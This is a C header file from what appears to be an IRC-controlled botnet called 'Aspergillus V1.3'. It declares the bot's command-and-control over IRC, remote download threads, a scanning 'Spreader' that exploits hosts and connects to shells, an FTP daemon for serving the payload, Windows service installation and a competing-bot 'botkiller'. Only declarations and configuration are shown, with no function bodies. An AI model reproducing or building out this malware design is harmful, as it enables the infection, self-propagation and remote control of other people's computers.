/*
		Aspergillus V1.3 by D
		Copyright (c) 2007
*/

#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker, "/RELEASE")			// Release code
#pragma comment(linker, "/opt:nowin98")
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.

#define DEBUG

#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>
#include <stdlib.h>
#include <Winsvc.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <shlobj.h>

#define MAX_RANDOM_LETTERS		16
#define MAX_LINE				512
#define MAX_RECEIVE_BUFFER		2048
#define MAX_WORDS				64
#define THREAD_WAIT_TIME		30
#define MAX_THREADS				256
#define PSCAN_DELAY				5
#define FTPD_MAX_PENDING		8

//#define NO_MD5
#define NO_PATCHER
#define NO_BOTKILLER
//#define NO_VNC
//#define NO_SYM

#include "patcher.h"
#include "botkiller.h"

typedef enum
{
	MSG_PASS,
	MSG_NICK,
	MSG_USER,
	MSG_PONG,
	MSG_JOIN,
	MSG_PRIVMSG,
	MSG_QUIT
} ircmessage;

typedef enum
{
	NONE,
	T_DOWNLOAD,
	T_SCAN,
	T_FTPD,
	T_FTPDC,
	T_PATCHER,
	T_BOTKILLER
} thread_type;

typedef struct 
{
	char	url[256];
	char	destination[MAX_PATH];
	char	channel[128];
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} download_s;

typedef struct
{
	unsigned long	ip;
	char			ip_char[16];
	char			myip[16];
	unsigned short	port;
	unsigned short	ftp_port;
	char			ftp_user[32];
	char			ftp_pass[32];
	SOCKET			ircsock;
	char			channel[128];
	int				cftp;
} exparam_s;

typedef struct
{
	HANDLE		tHandle;
	thread_type type;
	SOCKET		tsock;
} thread_s;

extern thread_s		threads[MAX_THREADS];
extern char			cfg_servicename[];
extern char			cfg_mutex[];
extern char			cfg_filename[];
extern char			cfg_cftp_host[128];
extern int			cfg_cftp_port;
extern char			cfg_cftp_user[32];
extern char			cfg_cftp_pass[32];
extern char			cfg_cftp_file[32];
extern unsigned short		ftp_port;

// functions
char *Decode(char *string);
unsigned int Resolve(char *host);
char *GetMyIP(SOCKET sock);
BOOL IsLanBot(SOCKET sock);
char *GenerateRandomLetters(unsigned int len);
HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);

int SC_Main(int argc, char *argv[]);
int SC_Install(char *svcpath, char *current);
void SC_StopOrUninstall(BOOL uninstall);

DWORD WINAPI IRC_Thread(LPVOID param);
int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to);
int IRC_Connect(char *host, unsigned short port);

DWORD WINAPI DL_Thread(LPVOID param);

void Spreader_Start(SOCKET ircsock, char *channel, int thrds, char *range, int rnd, int cftp, char *lanrange, char *myip);
void Spreader_Stop(SOCKET ircsock, char *channel);
void Spreader_GetCFTP(SOCKET ircsock, char *channel);
void Spreader_ConnectShell(exparam_s exparam, unsigned short port);
void Spreader_IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to);
void Spreader_Offline();


